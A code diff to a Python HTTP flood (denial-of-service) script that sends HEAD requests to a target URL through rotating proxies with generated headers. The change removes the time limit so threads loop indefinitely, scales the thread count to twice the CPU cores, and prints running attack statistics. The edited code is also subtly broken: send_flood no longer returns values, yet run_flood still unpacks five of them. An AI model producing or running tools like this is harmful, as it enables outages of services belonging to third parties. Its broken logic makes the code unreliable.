@@ -5,6 +5,7 @@ import time
 import sys
 import os
 import httpx
+import psutil
 
 # Load files
 def load_file(filename):
@@ -49,15 +50,22 @@ def clear_terminal():
     else:
         os.system('clear')
 
+# Function to determine the number of threads based on CPU usage
+def get_max_threads():
+    # Get the number of CPU cores available on the machine
+    cpu_count = psutil.cpu_count(logical=True)
+    # Use 2 threads per CPU core (can be adjusted based on the load you want to achieve)
+    return cpu_count * 2  # For example, using 2x the number of CPU cores for threads
+
 # Send flood requests function
-def send_flood(target, time_limit, max_threads):
+def send_flood(target):
     attempted, success, failed = 0, 0, 0
     peak_rps = 0
     start_time = time.time()
 
     def attack():
         nonlocal attempted, success, failed, peak_rps
-        while time.time() - start_time < time_limit:
+        while True:
             headers = generate_headers()
             proxy = random.choice(proxies) if proxies else None
             try:
@@ -67,7 +75,7 @@ def send_flood(target, time_limit, max_threads):
                 else:
                     with httpx.Client(http2=True, timeout=3) as client:
                         res = client.head(target, headers=headers)
-                
+
                 attempted += 1
                 if res.status_code == 200:  # If request goes through successfully
                     success += 1
@@ -83,9 +91,10 @@ def send_flood(target, time_limit, max_threads):
             if rps > peak_rps:
                 peak_rps = rps
 
-    # Dynamically scale threads to max system power
-    num_threads = max_threads  # Customize thread limit if necessary
-
+    # Dynamically scale threads based on CPU cores
+    num_threads = get_max_threads()  # Use twice the number of CPU cores
+    print(f"Scaling attack to {num_threads} threads.")
+    
     # Create threads
     threads = []
     for _ in range(num_threads):
@@ -94,39 +103,47 @@ def send_flood(target, time_limit, max_threads):
         threads.append(t)
 
     for t in threads:
-        t.join(timeout=time_limit)
-
-    elapsed_time = round(time.time() - start_time, 2)
-    if elapsed_time > 20:
-        elapsed_time = 20
-
-    peak_rps = round(peak_rps, 2)
-    return attempted, success, failed, peak_rps, elapsed_time
+        t.join()  # Allow threads to run indefinitely
 
 # Running the flood
-def run_flood(target, duration):
-    total, success, failed, peak, elapsed = send_flood(target, duration, 500)
-    
-    clear_terminal()
-    print(f"TOTAL REQUESTS SENT: {total}")
-    print(f"SUCCES: {success}")
-    print(f"FAILED: {failed}")
-    print(f"TIME REMAINING: {max(0, duration - elapsed)} seconds")
+def run_flood(target):
+    total, success, failed, peak, elapsed = 0, 0, 0, 0, 0
 
+    # Start attack
     clear_terminal()
-    print(f"TOTAL REQUESTS: {total}")
-    print(f"SUCCES: {success}")
-    print(f"FAILED: {failed}")
-    print(f"PEAK REQUESTS PER SECOND: {peak}")
+    print("Starting attack...")
+    print(f"Target: {target}")
+
+    try:
+        while True:
+            attempted, success, failed, peak_rps, elapsed_time = send_flood(target)
+
+            # Clear terminal periodically and print attack stats
+            clear_terminal()
+            print(f"TOTAL REQUESTS SENT: {attempted}")
+            print(f"SUCCES: {success}")
+            print(f"FAILED: {failed}")
+            print(f"PEAK REQUESTS PER SECOND: {peak_rps}")
+            print(f"TIME ELAPSED: {round(elapsed_time, 2)} seconds")
+
+            # Periodically update status every few seconds
+            time.sleep(2)
+    except KeyboardInterrupt:
+        # Handle manual stop via CTRL+C
+        print("\nAttack stopped manually.")
+        clear_terminal()
+        print(f"TOTAL REQUESTS SENT: {attempted}")
+        print(f"SUCCES: {success}")
+        print(f"FAILED: {failed}")
+        print(f"PEAK REQUESTS PER SECOND: {peak_rps}")
 
 if __name__ == "__main__":
-    if len(sys.argv) != 3:
-        print("Usage: python3 main.py <target_url> <duration_in_seconds>")
+    if len(sys.argv) != 2:
+        print("Usage: python3 main.py <target_url>")
         sys.exit(1)
 
     target_url = sys.argv[1]
-    duration = int(sys.argv[2])
 
     # Run flood directly from VPS
-    run_flood(target_url, duration)
+    run_flood(target_url)
     
